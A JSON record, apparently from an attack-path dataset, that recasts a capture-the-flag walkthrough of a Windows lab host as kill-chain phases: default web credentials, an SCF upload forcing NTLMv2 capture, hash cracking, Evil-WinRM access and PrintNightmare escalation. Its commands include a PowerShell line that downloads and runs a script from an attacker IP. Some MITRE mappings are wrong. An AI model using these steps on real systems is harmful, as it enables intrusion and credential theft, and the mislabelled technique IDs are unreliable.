@@ -1,0 +1,138 @@
+{
+  "id": "ap-0008",
+  "title": "Default Credentials & SCF Hash Capture to Print Spooler Privilege Escalation",
+  "summary": "Initial access gained by combining default web application credentials with an SCF file attack to capture an NTLMv2 hash, followed by connecting via WinRM and escalating privileges using the PrintNightmare vulnerability.",
+  "attack_path_markdown": "### Step 1\nPerform network reconnaissance using Nmap, identifying open ports 80, 135, 445, and 5985 on the Windows target (10.10.11.106) [1, 2].\n### Step 2\nAccess the web service on port 80 and authenticate using default credentials (admin:admin) [3].\n### Step 3\nUtilize the web application's file upload feature ('Firmware Update Center') to deliver a malicious SCF file designed to capture the NTLMv2 hash of the user reviewing the file (Tony), by forcing the retrieval of an icon from an attacker-controlled SMB server [3-5].\n### Step 4\nCapture the NTLMv2 hash using an SMB server tool (e.g., Impacket's smbserver) [5, 6].\n### Step 5\nCrack the captured hash (Tony::... ) to obtain the password ('Milton') using John the Ripper [7, 8].\n### Step 6\nGain interactive access as the low-privileged user Tony using Evil-WinRM, identified by the open WinRM port (5985) [9, 10].\n### Step 7\nUpload and execute enumeration tools (like WinPEAS or PowerUp) to find potential privilege escalation vectors [11, 12].\n### Step 8\nExecute a known Print Spooler exploit (PrintNightmare, CVE-2021-1675) using a PowerShell script to create a new user with administrative privileges ('savitar') [13-15].\n### Step 9\nConnect via Evil-WinRM using the new administrative user to retrieve the final flag [16].",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Determine the operating system (Windows) and identify exposed services (HTTP, SMB, WinRM).",
+      "actions": ["Ping target host", "Full TCP port scanning", "Service version detection", "Web technology enumeration"],
+      "tools": ["ping", "Nmap", "Nmap scripts", "smbclient", "whatweb"],
+      "techniques": ["Network Service Scanning", "OS Fingerprinting", "Service Enumeration (IIS, WinRM)"],
+      "mitre_ids": ["T1046"],
+      "indicators": ["TTL 127/128 (Windows)", "Open ports: 80, 445, 5985", "Microsoft IIS 10.0 detected"],
+      "preconditions": "Network connectivity to the target 10.10.11.106 [17].",
+      "expected_outcome": "Discovery of open ports 80, 135, 445, and 5985 [2].",
+      "confidence": 1.0,
+      "commands": [
+        "`ping 10.10.11.106` [17]",
+        "`nmap -p- -sC -sV -T5 --max-rate 5000 -n -Pn 10.10.11.106 -oG goal_ports` [1, 18]",
+        "`smbclient -L 10.10.11.106 -N` [18]",
+        "`whatweb 10.10.11.106` [19]"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of resources: setup of SMB share for hash capture and acquisition of the PrintNightmare privilege escalation script.",
+      "actions": ["Create SCF file structure", "Setup SMB listening server", "Download PowerShell PE exploit script"],
+      "tools": ["empacket smb server", "Wget", "Text editor"],
+      "techniques": ["Malicious File Creation (SCF)", "Exploit Development/Preparation"],
+      "mitre_ids": ["T1558.003"],
+      "indicators": ["SCF file is ready for upload", "SMB server running on attacker machine."],
+      "preconditions": "Web application file upload functionality discovered.",
+      "expected_outcome": "Attacker control over resources needed for credential access and privilege escalation.",
+      "confidence": 0.9,
+      "commands": [
+        "`sudo impacket-smbserver smb_folder $(pwd) -smb2support` [6]",
+        "`wget <PrintNightmare_PowerShell_script_URL>` [20]"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Gain initial foothold via web application default credentials and deliver the SCF file.",
+      "actions": ["Authenticate to the web service", "Upload malicious SCF file"],
+      "tools": ["Web browser/HTTP client"],
+      "techniques": ["Default Credentials", "File Upload"],
+      "mitre_ids": ["T1078.001", "T1105"],
+      "indicators": ["Successful web login (admin:admin)", "SCF file uploaded via 'Firmware Update Center' [3, 5]."],
+      "preconditions": "Valid default credentials for web service (admin:admin) [3].",
+      "expected_outcome": "SCF file available on the target system for user interaction [5].",
+      "confidence": 1.0,
+      "commands": [
+        "N/A (Web UI interaction). Credentials: admin/admin"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Exploit the user viewing the SCF file to capture the NTLMv2 hash, followed by cracking the hash to gain user credentials (Tony:Milton).",
+      "actions": ["Trigger SCF file to force authentication", "Capture NTLMv2 Hash", "Crack Hash"],
+      "tools": ["John the Ripper (JTR)", "impacket-smbserver"],
+      "techniques": ["Forced NTLMv2 Authentication (SCF)", "Password Cracking"],
+      "mitre_ids": ["T1558.003", "T1110.001"],
+      "indicators": ["NTLMv2 hash captured for user 'Tony'", "Password successfully cracked (Milton) [5, 8]."],
+      "preconditions": "SCF file successfully delivered and viewed by a system user [5].",
+      "expected_outcome": "Acquisition of valid user credentials (Tony:Milton) [8].",
+      "confidence": 1.0,
+      "commands": [
+        "`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` [7]"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establish persistent and interactive access using the newly acquired credentials via WinRM.",
+      "actions": ["Validate credentials using crackmapexec", "Establish Evil-WinRM session"],
+      "tools": ["Evil-WinRM", "CrackMapExec"],
+      "techniques": ["Remote Services: Windows Remote Management"],
+      "mitre_ids": ["T1021.006"],
+      "indicators": ["Successful connection to WinRM port 5985 as user 'Tony' [9]."],
+      "preconditions": "Valid credentials for a WinRM-enabled user (Tony:Milton) [8].",
+      "expected_outcome": "Interactive shell access as the low-privileged user 'Tony' [10].",
+      "confidence": 1.0,
+      "commands": [
+        "`crackmapexec smb 10.10.11.106 -u tony -p Milton` [8]",
+        "`evil-winrm -i 10.10.11.106 -u tony -p Milton` [9]"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Execute system information discovery and prepare for local privilege escalation.",
+      "actions": ["Execute system information commands", "Upload privilege escalation enumeration tool (WinPEAS)"],
+      "tools": ["Evil-WinRM", "PowerUp (or WinPEAS)"],
+      "techniques": ["System Information Discovery", "Internal tool execution"],
+      "mitre_ids": ["T1082"],
+      "indicators": ["Identification of Windows 10 Enterprise", "Enumeration output suggesting potential privilege escalation paths related to the print spooler service [11, 21]."],
+      "preconditions": "Low-privileged shell access (as Tony) [10].",
+      "expected_outcome": "Upload of the necessary PrintNightmare exploit script and confirmation of escalation path.",
+      "confidence": 0.9,
+      "commands": [
+        "`systeminfo` [22]",
+        "`upload /path/to/winpeas.exe C:\\path\\to\\upload\\winpeas.exe` [12]"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Exploit PrintNightmare (CVE-2021-1675) to gain administrative access and retrieve the final flag.",
+      "actions": ["Execute Print Spooler privilege escalation exploit (PrintNightmare)", "Create new administrator user", "Access Administrator desktop", "Retrieve root flag"],
+      "tools": ["PowerShell exploit script", "Evil-WinRM"],
+      "techniques": ["Exploitation for Privilege Escalation", "Account Creation"],
+      "mitre_ids": ["T1068", "T1136", "CVE-2021-1675"],
+      "indicators": ["New administrative user 'savitar' successfully created", "Access to Administrator directory [14, 16]."],
+      "preconditions": "PowerShell script uploaded and system information gathered [13, 20].",
+      "expected_outcome": "Compromise of the Administrator account and successful flag retrieval.",
+      "confidence": 1.0,
+      "commands": [
+        "`iex (New-Object Net.WebClient).DownloadString('http://10.10.14.29/printnightmare.ps1')` [13]",
+        "`Invoke-Nightmare -Username savitar -Password savitar123!` [14]",
+        "`evil-winrm -i 10.10.11.106 -u savitar -p savitar123!` [16]",
+        "`type C:\\Users\\Administrator\\Desktop\\root.txt` [16]"
+      ]
+    }
+  ],
+  "tactics": ["Reconnaissance", "Initial Access", "Credential Access", "Privilege Escalation"],
+  "techniques": ["Default Credentials", "NTLMv2 Hash Capture (SCF File)", "Windows Remote Management", "Print Spooler Vulnerability (PrintNightmare)"],
+  "mitre_ids": ["T1078.001", "T1558.003", "T1021.006", "T1068", "CVE-2021-1675"],
+  "hosts": ["10.10.11.106"],
+  "privs_obtained": ["domain user (Tony)", "local administrator (savitar)"],
+  "confidence": 0.9,
+  "source_file": "",
+  "notes": "The procedure relies on multiple vulnerabilities, including web application misconfiguration (default credentials), an SMB protocol trick (SCF file), and an operating system vulnerability (PrintNightmare). The CVE associated with the PrintNightmare exploit is 2021-1675 [23].",
+  "labels": ["attack_path", "windows", "web_exploit", "privesc", "printnightmare"]
+}
